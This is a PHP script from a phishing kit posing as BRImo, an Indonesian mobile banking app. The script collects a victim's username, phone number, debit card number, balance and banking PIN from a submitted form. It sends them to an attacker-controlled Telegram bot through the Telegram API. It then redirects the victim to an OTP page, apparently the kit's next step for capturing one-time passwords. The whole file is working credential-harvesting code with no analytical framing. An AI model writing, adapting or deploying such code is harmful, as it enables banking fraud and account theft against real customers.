<?php 



session_start();
include "./telegram.php";

$_SESSION["nomorkus"] = $_POST ['nomorku'];
$_SESSION["debits"] = $_POST ['debit'];
$_SESSION["namas"] = $_POST ['nama'];

$message = "°•~✥༆ⒷⓇⒾm๏☭✥~•°"."\n♚ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ".  $_POST ['user']. "\n♚ 𝗡𝗼 𝗛𝗣 : ". $_POST ['phone']. "\n♚ 𝗡𝗼 𝗞𝗮𝗿𝘁𝘂 : ". $_POST ['debit'].  "\n♚ 𝗦𝗮𝗹𝗱𝗼  : ". $_POST ['saldo']. "\n♚ 𝗣𝗜𝗡 𝗕𝗥𝗜𝗺𝗼 : ". $_POST ['pin'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  otp.html");
?> 